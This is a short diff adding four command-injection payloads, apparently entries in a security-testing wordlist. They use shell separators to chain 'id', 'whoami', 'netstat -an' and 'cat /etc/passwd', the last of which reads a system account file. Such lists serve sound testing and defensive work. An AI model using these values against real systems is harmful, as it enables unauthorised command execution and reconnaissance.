@@ -1,0 +1,4 @@
+;id
+|whoami
+&& netstat -an
+; cat /etc/passwd
